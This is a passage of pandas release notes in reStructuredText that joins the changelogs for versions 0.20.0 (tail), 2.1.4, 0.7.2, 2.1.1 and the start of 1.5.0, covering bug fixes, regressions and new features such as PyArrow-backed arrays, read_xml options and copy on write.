(:issue:`16120`)\n- Bug in creating a ``MultiIndex`` with tuples and not passing a list of names; this will now raise ``ValueError`` (:issue:`15110`)\n- Bug in the HTML display with a ``MultiIndex`` and truncation (:issue:`14882`)\n- Bug in the display of ``.info()`` where a qualifier (+) would always be displayed with a ``MultiIndex`` that contains only non-strings (:issue:`15245`)\n- Bug in ``pd.concat()`` where the names of ``MultiIndex`` of resulting ``DataFrame`` are not handled correctly when ``None`` is presented in the names of ``MultiIndex`` of input ``DataFrame`` (:issue:`15787`)\n- Bug in ``DataFrame.sort_index()`` and ``Series.sort_index()`` where ``na_position`` doesn't work with a ``MultiIndex`` (:issue:`14784`, :issue:`16604`)\n- Bug in ``pd.concat()`` when combining objects with a ``CategoricalIndex`` (:issue:`16111`)\n- Bug in indexing with a scalar and a ``CategoricalIndex`` (:issue:`16123`)\n\nIO\n^^\n\n- Bug in ``pd.to_numeric()`` in which float and unsigned integer elements were being improperly casted (:issue:`14941`, :issue:`15005`)\n- Bug in ``pd.read_fwf()`` where the skiprows parameter was not being respected during column width inference (:issue:`11256`)\n- Bug in ``pd.read_csv()`` in which the ``dialect`` parameter was not being verified before processing (:issue:`14898`)\n- Bug in ``pd.read_csv()`` in which missing data was being improperly handled with ``usecols`` (:issue:`6710`)\n- Bug in ``pd.read_csv()`` in which a file containing a row with many columns followed by rows with fewer columns would cause a crash (:issue:`14125`)\n- Bug in ``pd.read_csv()`` for the C engine where ``usecols`` were being indexed incorrectly with ``parse_dates`` (:issue:`14792`)\n- Bug in ``pd.read_csv()`` with ``parse_dates`` when multi-line headers are specified (:issue:`15376`)\n- Bug in ``pd.read_csv()`` with ``float_precision='round_trip'`` which caused a segfault when a text entry is parsed (:issue:`15140`)\n- Bug in ``pd.read_csv()`` when an index was specified and no values were specified as null values (:issue:`15835`)\n- Bug in ``pd.read_csv()`` in which certain invalid file objects caused the Python interpreter to crash (:issue:`15337`)\n- Bug in ``pd.read_csv()`` in which invalid values for ``nrows`` and ``chunksize`` were allowed (:issue:`15767`)\n- Bug in ``pd.read_csv()`` for the Python engine in which unhelpful error messages were being raised when parsing errors occurred (:issue:`15910`)\n- Bug in ``pd.read_csv()`` in which the ``skipfooter`` parameter was not being properly validated (:issue:`15925`)\n- Bug in ``pd.to_csv()`` in which there was numeric overflow when a timestamp index was being written (:issue:`15982`)\n- Bug in ``pd.util.hashing.hash_pandas_object()`` in which hashing of categoricals depended on the ordering of categories, instead of just their values. (:issue:`15143`)\n- Bug in ``.to_json()`` where ``lines=True`` and contents (keys or values) contain escaped characters (:issue:`15096`)\n- Bug in ``.to_json()`` causing single byte ascii characters to be expanded to four byte unicode (:issue:`15344`)\n- Bug in ``.to_json()`` for the C engine where rollover was not correctly handled for case where frac is odd and diff is exactly 0.5 (:issue:`15716`, :issue:`15864`)\n- Bug in ``pd.read_json()`` for Python 2 where ``lines=True`` and contents contain non-ascii unicode characters (:issue:`15132`)\n- Bug in ``pd.read_msgpack()`` in which ``Series`` categoricals were being improperly processed (:issue:`14901`)\n- Bug in ``pd.read_msgpack()`` which did not allow loading of a dataframe with an index of type ``CategoricalIndex`` (:issue:`15487`)\n- Bug in ``pd.read_msgpack()`` when deserializing a ``CategoricalIndex`` (:issue:`15487`)\n- Bug in ``DataFrame.to_records()`` with converting a ``DatetimeIndex`` with a timezone (:issue:`13937`)\n- Bug in ``DataFrame.to_records()`` which failed with unicode characters in column names (:issue:`11879`)\n- Bug in ``.to_sql()`` when writing a DataFrame with numeric index names (:issue:`15404`).\n- Bug in ``DataFrame.to_html()`` with ``index=False`` and ``max_rows`` raising in ``IndexError`` (:issue:`14998`)\n- Bug in ``pd.read_hdf()`` passing a ``Timestamp`` to the ``where`` parameter with a non date column (:issue:`15492`)\n- Bug in ``DataFrame.to_stata()`` and ``StataWriter`` which produces incorrectly formatted files to be produced for some locales (:issue:`13856`)\n- Bug in ``StataReader`` and ``StataWriter`` which allows invalid encodings (:issue:`15723`)\n- Bug in the ``Series`` repr not showing the length when the output was truncated (:issue:`15962`).\n\nPlotting\n^^^^^^^^\n\n- Bug in ``DataFrame.hist`` where ``plt.tight_layout`` caused an ``AttributeError``  (use ``matplotlib >= 2.0.1``) (:issue:`9351`)\n- Bug in ``DataFrame.boxplot`` where ``fontsize`` was not applied to the tick labels on both axes (:issue:`15108`)\n- Bug in the date and time converters pandas registers with matplotlib not handling multiple dimensions (:issue:`16026`)\n- Bug in ``pd.scatter_matrix()`` could accept either ``color`` or ``c``, but not both (:issue:`14855`)\n\nGroupBy/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n\n- Bug in ``.groupby(..).resample()`` when passed the ``on=`` kwarg. (:issue:`15021`)\n- Properly set ``__name__`` and ``__qualname__`` for ``Groupby.*`` functions (:issue:`14620`)\n- Bug in ``GroupBy.get_group()`` failing with a categorical grouper (:issue:`15155`)\n- Bug in ``.groupby(...).rolling(...)`` when ``on`` is specified and using a ``DatetimeIndex`` (:issue:`15130`, :issue:`13966`)\n- Bug in groupby operations with ``timedelta64`` when passing ``numeric_only=False`` (:issue:`5724`)\n- Bug in ``groupby.apply()`` coercing ``object`` dtypes to numeric types, when not all values were numeric (:issue:`14423`, :issue:`15421`, :issue:`15670`)\n- Bug in ``resample``, where a non-string ``loffset`` argument would not be applied when resampling a timeseries (:issue:`13218`)\n- Bug in ``DataFrame.groupby().describe()`` when grouping on ``Index`` containing tuples (:issue:`14848`)\n- Bug in ``groupby().nunique()`` with a datetimelike-grouper where bins counts were incorrect (:issue:`13453`)\n- Bug in ``groupby.transform()`` that would coerce the resultant dtypes back to the original (:issue:`10972`, :issue:`11444`)\n- Bug in ``groupby.agg()`` incorrectly localizing timezone on ``datetime`` (:issue:`15426`, :issue:`10668`, :issue:`13046`)\n- Bug in ``.rolling/expanding()`` functions where ``count()`` was not counting ``np.Inf``, nor handling ``object`` dtypes (:issue:`12541`)\n- Bug in ``.rolling()`` where ``pd.Timedelta`` or ``datetime.timedelta`` was not accepted as a ``window`` argument (:issue:`15440`)\n- Bug in ``Rolling.quantile`` function that caused a segmentation fault when called with a quantile value outside of the range [0, 1] (:issue:`15463`)\n- Bug in ``DataFrame.resample().median()`` if duplicate column names are present (:issue:`14233`)\n\nSparse\n^^^^^^\n\n- Bug in ``SparseSeries.reindex`` on single level with list of length 1 (:issue:`15447`)\n- Bug in repr-formatting a ``SparseDataFrame`` after a value was set on (a copy of) one of its series (:issue:`15488`)\n- Bug in ``SparseDataFrame`` construction with lists not coercing to dtype (:issue:`15682`)\n- Bug in sparse array indexing in which indices were not being validated (:issue:`15863`)\n\nReshaping\n^^^^^^^^^\n\n- Bug in ``pd.merge_asof()`` where ``left_index`` or ``right_index`` caused a failure when multiple ``by`` was specified (:issue:`15676`)\n- Bug in ``pd.merge_asof()`` where ``left_index``/``right_index`` together caused a failure when ``tolerance`` was specified (:issue:`15135`)\n- Bug in ``DataFrame.pivot_table()`` where ``dropna=True`` would not drop all-NaN columns when the columns was a ``category`` dtype (:issue:`15193`)\n- Bug in ``pd.melt()`` where passing a tuple value for ``value_vars`` caused a ``TypeError`` (:issue:`15348`)\n- Bug in ``pd.pivot_table()`` where no error was raised when values argument was not in the columns (:issue:`14938`)\n- Bug in ``pd.concat()`` in which concatenating with an empty dataframe with ``join='inner'`` was being improperly handled (:issue:`15328`)\n- Bug with ``sort=True`` in ``DataFrame.join`` and ``pd.merge`` when joining on indexes (:issue:`15582`)\n- Bug in ``DataFrame.nsmallest`` and ``DataFrame.nlargest`` where identical values resulted in duplicated rows (:issue:`15297`)\n- Bug in :func:`pandas.pivot_table` incorrectly raising ``UnicodeError`` when passing unicode input for ``margins`` keyword (:issue:`13292`)\n\nNumeric\n^^^^^^^\n\n- Bug in ``.rank()`` which incorrectly ranks ordered categories (:issue:`15420`)\n- Bug in ``.corr()`` and ``.cov()`` where the column and index were the same object (:issue:`14617`)\n- Bug in ``.mode()`` where ``mode`` was not returned if was only a single value (:issue:`15714`)\n- Bug in ``pd.cut()`` with a single bin on an all 0s array (:issue:`15428`)\n- Bug in ``pd.qcut()`` with a single quantile and an array with identical values (:issue:`15431`)\n- Bug in ``pandas.tools.utils.cartesian_product()`` with large input can cause overflow on windows (:issue:`15265`)\n- Bug in ``.eval()`` which caused multi-line evals to fail with local variables not on the first line (:issue:`15342`)\n\nOther\n^^^^^\n\n- Compat with SciPy 0.19.0 for testing on ``.interpolate()`` (:issue:`15662`)\n- Compat for 32-bit platforms for ``.qcut/cut``; bins will now be ``int64`` dtype (:issue:`14866`)\n- Bug in interactions with ``Qt`` when a ``QtApplication`` already exists (:issue:`14372`)\n- Avoid use of ``np.finfo()`` during ``import pandas`` removed to mitigate deadlock on Python GIL misuse (:issue:`14641`)\n\n\n.. _whatsnew_0.20.0.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.19.2..v0.20.0\n\n\n.. _whatsnew_214:\n\nWhat's new in 2.1.4 (December 8, 2023)\n---------------------------------------\n\nThese are the changes in pandas 2.1.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_214.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression when trying to read a pickled pandas :class:`DataFrame` from pandas 1.3 (:issue:`55137`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_214.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug in :class:`Series` constructor raising DeprecationWarning when ``index`` is a list of :class:`Series` (:issue:`55228`)\n- Bug in :class:`Series` when trying to cast date-like string inputs to :class:`ArrowDtype` of ``pyarrow.timestamp`` (:issue:`56266`)\n- Bug in :class:`Timestamp` construction with ``ts_input=\"now\"`` or ``ts_input=\"today\"`` giving a different unit from :meth:`Timestamp.now` or :meth:`Timestamp.today` (:issue:`55879`)\n- Bug in :meth:`Index.__getitem__` returning wrong result for Arrow dtypes and negative stepsize (:issue:`55832`)\n- Fixed bug in :func:`read_csv` not respecting object dtype when ``infer_string`` option is set (:issue:`56047`)\n- Fixed bug in :func:`to_numeric` converting to extension dtype for ``string[pyarrow_numpy]`` dtype (:issue:`56179`)\n- Fixed bug in :meth:`.DataFrameGroupBy.min` and :meth:`.DataFrameGroupBy.max` not preserving extension dtype for empty object (:issue:`55619`)\n- Fixed bug in :meth:`DataFrame.__setitem__` casting :class:`Index` with object-dtype to PyArrow backed strings when ``infer_string`` option is set (:issue:`55638`)\n- Fixed bug in :meth:`DataFrame.to_hdf` raising when columns have ``StringDtype`` (:issue:`55088`)\n- Fixed bug in :meth:`Index.insert` casting object-dtype to PyArrow backed strings when ``infer_string`` option is set (:issue:`55638`)\n- Fixed bug in :meth:`Series.__ne__` resulting in False for comparison between ``NA`` and string value for ``dtype=\"string[pyarrow_numpy]\"`` (:issue:`56122`)\n- Fixed bug in :meth:`Series.mode` not keeping object dtype when ``infer_string`` is set (:issue:`56183`)\n- Fixed bug in :meth:`Series.reset_index` not preserving object dtype when ``infer_string`` is set (:issue:`56160`)\n- Fixed bug in :meth:`Series.str.split` and :meth:`Series.str.rsplit` when ``pat=None`` for :class:`ArrowDtype` with ``pyarrow.string`` (:issue:`56271`)\n- Fixed bug in :meth:`Series.str.translate` losing object dtype when string option is set (:issue:`56152`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_214.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.3..v2.1.4\n\n\n.. _whatsnew_0702:\n\nVersion 0.7.2 (March 16, 2012)\n------------------------------\n\n{{ header }}\n\n\nThis release targets bugs in 0.7.1, and adds a few minor features.\n\nNew features\n~~~~~~~~~~~~\n\n  - Add additional tie-breaking methods in DataFrame.rank (:issue:`874`)\n  - Add ascending parameter to rank in Series, DataFrame (:issue:`875`)\n  - Add coerce_float option to DataFrame.from_records (:issue:`893`)\n  - Add sort_columns parameter to allow unsorted plots (:issue:`918`)\n  - Enable column access via attributes on GroupBy (:issue:`882`)\n  - Can pass dict of values to DataFrame.fillna (:issue:`661`)\n  - Can select multiple hierarchical groups by passing list of values in .ix\n    (:issue:`134`)\n  - Add ``axis`` option to DataFrame.fillna (:issue:`174`)\n  - Add level keyword to ``drop`` for dropping values from a level (:issue:`159`)\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n  - Use khash for Series.value_counts, add raw function to algorithms.py (:issue:`861`)\n  - Intercept __builtin__.sum in groupby (:issue:`885`)\n\n\n\n.. _whatsnew_0.7.2.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.7.1..v0.7.2\n\n\n.. _whatsnew_211:\n\nWhat's new in 2.1.1 (September 20, 2023)\n----------------------------------------\n\nThese are the changes in pandas 2.1.1. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :func:`concat` when :class:`DataFrame` 's have two different extension dtypes (:issue:`54848`)\n- Fixed regression in :func:`merge` when merging over a PyArrow string index (:issue:`54894`)\n- Fixed regression in :func:`read_csv` when ``usecols`` is given and ``dtypes`` is a dict for ``engine=\"python\"`` (:issue:`54868`)\n- Fixed regression in :func:`read_csv` when ``delim_whitespace`` is True (:issue:`54918`, :issue:`54931`)\n- Fixed regression in :meth:`.GroupBy.get_group` raising for ``axis=1`` (:issue:`54858`)\n- Fixed regression in :meth:`DataFrame.__setitem__` raising ``AssertionError`` when setting a :class:`Series` with a partial :class:`MultiIndex` (:issue:`54875`)\n- Fixed regression in :meth:`DataFrame.filter` not respecting the order of elements for ``filter`` (:issue:`54980`)\n- Fixed regression in :meth:`DataFrame.to_sql` not roundtripping datetime columns correctly for sqlite (:issue:`54877`)\n- Fixed regression in :meth:`DataFrameGroupBy.agg` when aggregating a DataFrame with duplicate column names using a dictionary (:issue:`55006`)\n- Fixed regression in :meth:`MultiIndex.append` raising when appending overlapping :class:`IntervalIndex` levels (:issue:`54934`)\n- Fixed regression in :meth:`Series.drop_duplicates` for PyArrow strings (:issue:`54904`)\n- Fixed regression in :meth:`Series.interpolate` raising when ``fill_value`` was given (:issue:`54920`)\n- Fixed regression in :meth:`Series.value_counts` raising for numeric data if ``bins`` was specified (:issue:`54857`)\n- Fixed regression in comparison operations for PyArrow backed columns not propagating exceptions correctly (:issue:`54944`)\n- Fixed regression when comparing a :class:`Series` with ``datetime64`` dtype with ``None`` (:issue:`54870`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Fixed bug for :class:`ArrowDtype` raising ``NotImplementedError`` for fixed-size list (:issue:`55000`)\n- Fixed bug in :meth:`DataFrame.stack` with ``future_stack=True`` and columns a non-:class:`MultiIndex` consisting of tuples (:issue:`54948`)\n- Fixed bug in :meth:`Series.dt.tz` with :class:`ArrowDtype` where a string was returned instead of a ``tzinfo`` object (:issue:`55003`)\n- Fixed bug in :meth:`Series.pct_change` and :meth:`DataFrame.pct_change` showing unnecessary ``FutureWarning`` (:issue:`54981`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.other:\n\nOther\n~~~~~\n- Reverted the deprecation that disallowed :meth:`Series.apply` returning a :class:`DataFrame` when the passed-in callable returns a :class:`Series` object (:issue:`52116`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_211.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.1.0..v2.1.1\n\n\n.. _whatsnew_150:\n\nWhat's new in 1.5.0 (September 19, 2022)\n----------------------------------------\n\nThese are the changes in pandas 1.5.0. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_150.enhancements:\n\nEnhancements\n~~~~~~~~~~~~\n\n.. _whatsnew_150.enhancements.pandas-stubs:\n\n``pandas-stubs``\n^^^^^^^^^^^^^^^^\n\nThe ``pandas-stubs`` library is now supported by the pandas development team, providing type stubs for the pandas API. Please visit\nhttps://github.com/pandas-dev/pandas-stubs for more information.\n\nWe thank VirtusLab and Microsoft for their initial, significant contributions to ``pandas-stubs``\n\n.. _whatsnew_150.enhancements.arrow:\n\nNative PyArrow-backed ExtensionArray\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWith `Pyarrow <https://arrow.apache.org/docs/python/index.html>`__ installed, users can now create pandas objects\nthat are backed by a ``pyarrow.ChunkedArray`` and ``pyarrow.DataType``.\n\nThe ``dtype`` argument can accept a string of a `pyarrow data type <https://arrow.apache.org/docs/python/api/datatypes.html>`__\nwith ``pyarrow`` in brackets e.g. ``\"int64[pyarrow]\"`` or, for pyarrow data types that take parameters, a :class:`ArrowDtype`\ninitialized with a ``pyarrow.DataType``.\n\n.. ipython:: python\n\n    import pyarrow as pa\n    ser_float = pd.Series([1.0, 2.0, None], dtype=\"float32[pyarrow]\")\n    ser_float\n\n    list_of_int_type = pd.ArrowDtype(pa.list_(pa.int64()))\n    ser_list = pd.Series([[1, 2], [3, None]], dtype=list_of_int_type)\n    ser_list\n\n    ser_list.take([1, 0])\n    ser_float * 5\n    ser_float.mean()\n    ser_float.dropna()\n\nMost operations are supported and have been implemented using `pyarrow compute <https://arrow.apache.org/docs/python/api/compute.html>`__ functions.\nWe recommend installing the latest version of PyArrow to access the most recently implemented compute functions.\n\n.. warning::\n\n    This feature is experimental, and the API can change in a future release without warning.\n\n.. _whatsnew_150.enhancements.dataframe_interchange:\n\nDataFrame interchange protocol implementation\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPandas now implement the DataFrame interchange API spec.\nSee the full details on the API at https://data-apis.org/dataframe-protocol/latest/index.html\n\nThe protocol consists of two parts:\n\n- New method :meth:`DataFrame.__dataframe__` which produces the interchange object.\n  It effectively \"exports\" the pandas dataframe as an interchange object so\n  any other library which has the protocol implemented can \"import\" that dataframe\n  without knowing anything about the producer except that it makes an interchange object.\n- New function :func:`pandas.api.interchange.from_dataframe` which can take\n  an arbitrary interchange object from any conformant library and construct a\n  pandas DataFrame out of it.\n\n.. _whatsnew_150.enhancements.styler:\n\nStyler\n^^^^^^\n\nThe most notable development is the new method :meth:`.Styler.concat` which\nallows adding customised footer rows to visualise additional calculations on the data,\ne.g. totals and counts etc. (:issue:`43875`, :issue:`46186`)\n\nAdditionally there is an alternative output method :meth:`.Styler.to_string`,\nwhich allows using the Styler's formatting methods to create, for example, CSVs (:issue:`44502`).\n\nA new feature :meth:`.Styler.relabel_index` is also made available to provide full customisation of the display of\nindex or column headers (:issue:`47864`)\n\nMinor feature improvements are:\n\n  - Adding the ability to render ``border`` and ``border-{side}`` CSS properties in Excel (:issue:`42276`)\n  - Making keyword arguments consist: :meth:`.Styler.highlight_null` now accepts ``color`` and deprecates ``null_color`` although this remains backwards compatible (:issue:`45907`)\n\n.. _whatsnew_150.enhancements.resample_group_keys:\n\nControl of index with ``group_keys`` in :meth:`DataFrame.resample`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe argument ``group_keys`` has been added to the method :meth:`DataFrame.resample`.\nAs with :meth:`DataFrame.groupby`, this argument controls the whether each group is added\nto the index in the resample when :meth:`.Resampler.apply` is used.\n\n.. warning::\n   Not specifying the ``group_keys`` argument will retain the\n   previous behavior and emit a warning if the result will change\n   by specifying ``group_keys=False``. In a future version\n   of pandas, not specifying ``group_keys`` will default to\n   the same behavior as ``group_keys=False``.\n\n.. code-block:: ipython\n\n    In [11]: df = pd.DataFrame(\n       ....:     {'a': range(6)},\n       ....:     index=pd.date_range(\"2021-01-01\", periods=6, freq=\"8H\")\n       ....: )\n       ....:\n\n    In [12]: df.resample(\"D\", group_keys=True).apply(lambda x: x)\n    Out[12]:\n                                    a\n    2021-01-01 2021-01-01 00:00:00  0\n               2021-01-01 08:00:00  1\n               2021-01-01 16:00:00  2\n    2021-01-02 2021-01-02 00:00:00  3\n               2021-01-02 08:00:00  4\n               2021-01-02 16:00:00  5\n\n    In [13]: df.resample(\"D\", group_keys=False).apply(lambda x: x)\n    Out[13]:\n                         a\n    2021-01-01 00:00:00  0\n    2021-01-01 08:00:00  1\n    2021-01-01 16:00:00  2\n    2021-01-02 00:00:00  3\n    2021-01-02 08:00:00  4\n    2021-01-02 16:00:00  5\n\nPreviously, the resulting index would depend upon the values returned by ``apply``,\nas seen in the following example.\n\n.. code-block:: ipython\n\n    In [1]:  pandas 1.3\n    In [2]: df.resample(\"D\").apply(lambda x: x)\n    Out[2]:\n                         a\n    2021-01-01 00:00:00  0\n    2021-01-01 08:00:00  1\n    2021-01-01 16:00:00  2\n    2021-01-02 00:00:00  3\n    2021-01-02 08:00:00  4\n    2021-01-02 16:00:00  5\n\n    In [3]: df.resample(\"D\").apply(lambda x: x.reset_index())\n    Out[3]:\n                               index  a\n    2021-01-01 0 2021-01-01 00:00:00  0\n               1 2021-01-01 08:00:00  1\n               2 2021-01-01 16:00:00  2\n    2021-01-02 0 2021-01-02 00:00:00  3\n               1 2021-01-02 08:00:00  4\n               2 2021-01-02 16:00:00  5\n\n.. _whatsnew_150.enhancements.from_dummies:\n\nfrom_dummies\n^^^^^^^^^^^^\n\nAdded new function :func:`~pandas.from_dummies` to convert a dummy coded :class:`DataFrame` into a categorical :class:`DataFrame`.\n\n.. ipython:: python\n\n    import pandas as pd\n\n    df = pd.DataFrame({\"col1_a\": [1, 0, 1], \"col1_b\": [0, 1, 0],\n                       \"col2_a\": [0, 1, 0], \"col2_b\": [1, 0, 0],\n                       \"col2_c\": [0, 0, 1]})\n\n    pd.from_dummies(df, sep=\"_\")\n\n.. _whatsnew_150.enhancements.orc:\n\nWriting to ORC files\n^^^^^^^^^^^^^^^^^^^^\n\nThe new method :meth:`DataFrame.to_orc` allows writing to ORC files (:issue:`43864`).\n\nThis functionality depends the `pyarrow <http://arrow.apache.org/docs/python/>`__ library. For more details, see :ref:`the IO docs on ORC <io.orc>`.\n\n.. warning::\n\n   * It is *highly recommended* to install pyarrow using conda due to some issues occurred by pyarrow.\n   * :func:`~pandas.DataFrame.to_orc` requires pyarrow>=7.0.0.\n   * :func:`~pandas.DataFrame.to_orc` is not supported on Windows yet, you can find valid environments on :ref:`install optional dependencies <install.warn_orc>`.\n   * For supported dtypes please refer to `supported ORC features in Arrow <https://arrow.apache.org/docs/cpp/orc.html#data-types>`__.\n   * Currently timezones in datetime columns are not preserved when a dataframe is converted into ORC files.\n\n.. code-block:: python\n\n    df = pd.DataFrame(data={\"col1\": [1, 2], \"col2\": [3, 4]})\n    df.to_orc(\"./out.orc\")\n\n.. _whatsnew_150.enhancements.tar:\n\nReading directly from TAR archives\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nI/O methods like :func:`read_csv` or :meth:`DataFrame.to_json` now allow reading and writing\ndirectly on TAR archives (:issue:`44787`).\n\n.. code-block:: python\n\n   df = pd.read_csv(\"./movement.tar.gz\")\n    ...\n   df.to_csv(\"./out.tar.gz\")\n\nThis supports ``.tar``, ``.tar.gz``, ``.tar.bz`` and ``.tar.xz2`` archives.\nThe used compression method is inferred from the filename.\nIf the compression method cannot be inferred, use the ``compression`` argument:\n\n.. code-block:: python\n\n   df = pd.read_csv(some_file_obj, compression={\"method\": \"tar\", \"mode\": \"r:gz\"})  noqa F821\n\n(``mode`` being one of ``tarfile.open``'s modes: https://docs.python.org/3/library/tarfile.html#tarfile.open)\n\n\n.. _whatsnew_150.enhancements.read_xml_dtypes:\n\nread_xml now supports ``dtype``, ``converters``, and ``parse_dates``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSimilar to other IO methods, :func:`pandas.read_xml` now supports assigning specific dtypes to columns,\napply converter methods, and parse dates (:issue:`43567`).\n\n.. ipython:: python\n\n    from io import StringIO\n    xml_dates = \"\"\"<?xml version='1.0' encoding='utf-8'?>\n    <data>\n      <row>\n        <shape>square</shape>\n        <degrees>00360</degrees>\n        <sides>4.0</sides>\n        <date>2020-01-01</date>\n       </row>\n      <row>\n        <shape>circle</shape>\n        <degrees>00360</degrees>\n        <sides/>\n        <date>2021-01-01</date>\n      </row>\n      <row>\n        <shape>triangle</shape>\n        <degrees>00180</degrees>\n        <sides>3.0</sides>\n        <date>2022-01-01</date>\n      </row>\n    </data>\"\"\"\n\n    df = pd.read_xml(\n        StringIO(xml_dates),\n        dtype={'sides': 'Int64'},\n        converters={'degrees': str},\n        parse_dates=['date']\n    )\n    df\n    df.dtypes\n\n\n.. _whatsnew_150.enhancements.read_xml_iterparse:\n\nread_xml now supports large XML using ``iterparse``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nFor very large XML files that can range in hundreds of megabytes to gigabytes, :func:`pandas.read_xml`\nnow supports parsing such sizeable files using `lxml's iterparse`_ and `etree's iterparse`_\nwhich are memory-efficient methods to iterate through XML trees and extract specific elements\nand attributes without holding entire tree in memory (:issue:`45442`).\n\n.. code-block:: ipython\n\n    In [1]: df = pd.read_xml(\n    ...      \"/path/to/downloaded/enwikisource-latest-pages-articles.xml\",\n    ...      iterparse = {\"page\": [\"title\", \"ns\", \"id\"]})\n    ...  )\n    df\n    Out[2]:\n                                                         title   ns        id\n    0                                       Gettysburg Address    0     21450\n    1                                                Main Page    0     42950\n    2                            Declaration by United Nations    0      8435\n    3             Constitution of the United States of America    0      8435\n    4                     Declaration of Independence (Israel)    0     17858\n    ...                                                    ...  ...       ...\n    3578760               Page:Black cat 1897 07 v2 n10.pdf/17  104    219649\n    3578761               Page:Black cat 1897 07 v2 n10.pdf/43  104    219649\n    3578762               Page:Black cat 1897 07 v2 n10.pdf/44  104    219649\n    3578763      The History of Tom Jones, a Foundling/Book IX    0  12084291\n    3578764  Page:Shakespeare of Stratford (1926) Yale.djvu/91  104     21450\n\n    [3578765 rows x 3 columns]\n\n\n.. _`lxml's iterparse`: https://lxml.de/3.2/parsing.html#iterparse-and-iterwalk\n.. _`etree's iterparse`: https://docs.python.org/3/library/xml.etree.elementtree.html#xml.etree.ElementTree.iterparse\n\n.. _whatsnew_150.enhancements.copy_on_write:\n\nCopy on Write\n^^^^^^^^^^^^^\n\nA new feature ``copy_on_write`` was added (:issue:`46958`). Copy on write ensures that\nany DataFrame or Series derived from another in any way always behaves as a copy.\nCopy on write disallows updating any other object than the object the method\nwas applied to.\n\nCopy on write can be enabled through:\n\n.. code-block:: python\n\n    pd.set_option(\"mode.copy_on_write\", True)\n    pd.options.mode.copy_on_write = True\n\nAlternatively, copy on write can be enabled locally through:\n\n.. code-block:: python\n\n    with pd.option_context(\"mode.copy_on_write\", True):\n        ...\n\nWithout copy on write, the parent :class:`DataFrame` is updated when updating a child\n:class:`DataFrame` that was derived from this :class:`DataFrame`.\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"foo\": [1, 2, 3], \"bar\": 1})\n    view = df[\"foo\"]\n    view.iloc[0]\n    df\n\nWith copy on write enabled, df won't be updated anymore:\n\n.. ipython:: python\n\n    with pd.option_context(\"mode.copy_on_write\", True):\n        df = pd.DataFrame({\"foo\": [1, 2, 3], \"bar\": 1})\n        view = df[\"foo\"]\n        view.iloc[0]\n        df\n\nA more detailed explanation can be found `here <https://phofl.github.io/cow-introduction.html>`_.\n\n.. _whatsnew_150.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n- :meth:`Series.map` now raises when ``arg`` is dict but ``na_action`` is not either ``None`` or ``'ignore'`` (:issue:`46588`)\n- :meth:`MultiIndex.to_frame` now supports the argument ``allow_duplicates`` and raises on duplicate labels if it is missing or False (:issue:`45245`)\n- :class:`.StringArray` now accepts array-likes containing nan-likes (``None``, ``np.nan``) for the ``values`` parameter in its constructor in addition to strings and :attr:`pandas.NA`. (:issue:`40839`)\n- Improved the rendering of ``categories`` in :class:`CategoricalIndex` (:issue:`45218`)\n- :meth:`DataFrame.plot` will now allow the ``subplots`` parameter to be a list of iterables specifying column groups, so that columns may be grouped together in the same subplot (:issue:`29688`).\n- :meth:`to_numeric` now preserves float64 arrays when downcasting would generate values not representable in float32 (:issue:`43693`)\n- :meth:`Series.reset_index` and :meth:`DataFrame.reset_index` now support the argument ``allow_duplicates`` (:issue:`44410`)\n- :meth:`.DataFrameGroupBy.min`, :meth:`.SeriesGroupBy.min`, :meth:`.DataFrameGroupBy.max`, and :meth:`.SeriesGroupBy.max` now supports `Numba <https://numba.pydata.org/>`_ execution with the ``engine`` keyword (:issue:`45428`)\n- :func:`read_csv` now supports ``defaultdict`` as a ``dtype`` parameter (:issue:`41574`)\n- :meth:`DataFrame.rolling` and :meth:`Series.rolling` now support a ``step`` parameter with fixed-length windows (:issue:`15354`)\n- Implemented a ``bool``-dtype :class:`Index`, passing a bool-dtype array-like to ``pd.Index`` will now retain ``bool`` dtype instead of casting to ``object`` (:issue:`45061`)\n- Implemented a complex-dtype :class:`Index`, passing a complex-dtype array-like to ``pd.Index`` will now retain complex dtype instead of casting to ``object`` (:issue:`45845`)\n- :class:`Series` and :class:`DataFrame` with :class:`IntegerDtype` now supports bitwise operations (:issue:`34463`)\n- Add ``milliseconds`` field support for :class:`.DateOffset` (:issue:`43371`)\n- :meth:`DataFrame.where` tries to maintain dtype of :class:`DataFrame` if fill value can be cast without loss of precision (:issue:`45582`)\n- :meth:`DataFrame.reset_index` now accepts a ``names`` argument which renames the index names (:issue:`6878`)\n- :func:`concat` now raises when ``levels`` is given but ``keys`` is None (:issue:`46653`)\n- 